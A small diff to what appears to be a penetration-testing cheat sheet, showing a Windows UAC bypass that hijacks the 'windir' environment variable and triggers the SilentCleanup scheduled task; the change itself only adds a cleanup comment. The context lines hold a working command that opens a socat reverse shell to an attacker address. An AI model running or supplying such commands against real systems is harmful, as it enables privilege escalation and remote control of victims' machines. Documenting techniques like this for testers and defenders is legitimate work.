@@ -677,6 +677,9 @@ Author: James Forshaw
 # cmd
 reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4446 EXEC:cmd.exe,pipes &REM " /f
 schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+
+# clean
 reg delete "HKCU\Environment" /v "windir" /f
+
 
 ```
